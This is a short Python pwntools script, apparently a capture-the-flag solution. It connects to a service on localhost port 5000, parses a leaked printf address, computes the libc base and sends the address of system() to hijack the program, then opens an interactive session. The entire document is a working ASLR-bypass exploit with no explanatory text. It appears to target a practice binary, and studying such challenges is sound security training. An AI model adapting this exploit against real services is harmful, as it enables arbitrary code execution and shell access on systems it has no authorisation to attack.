from pwn import *

context.terminal = ["konsole", "-e"]

r = remote("localhost", 5000)
# r = process("./bin", env={"LD_PRELOAD": "./libc.so.6"})
# r = gdb.debug("./bin")

libc = ELF("./libc.so.6")
printf_address = libc.symbols["printf"]
system_address = libc.symbols["system"]

r.recvuntil(b"In my libc, printf() is at ")
printf_real_address = int(r.recvuntil(",")[:-1], 16)

libc_base = printf_real_address - printf_address
system_real_address = libc_base + system_address

r.sendline(f"{system_real_address}".encode())
r.interactive()